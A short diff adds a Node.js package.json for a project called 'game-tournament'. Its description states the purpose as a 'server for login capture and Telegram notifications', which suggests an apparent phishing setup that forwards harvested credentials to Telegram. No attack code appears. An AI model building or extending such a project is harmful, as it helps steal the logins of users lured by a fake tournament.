@@ -1,0 +1,16 @@
+{
+  "name": "game-tournament",
+  "version": "1.0.0",
+  "description": "Server for login capture and Telegram notifications",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "express": "^4.18.2",
+    "axios": "^1.5.0"
+  }
+}
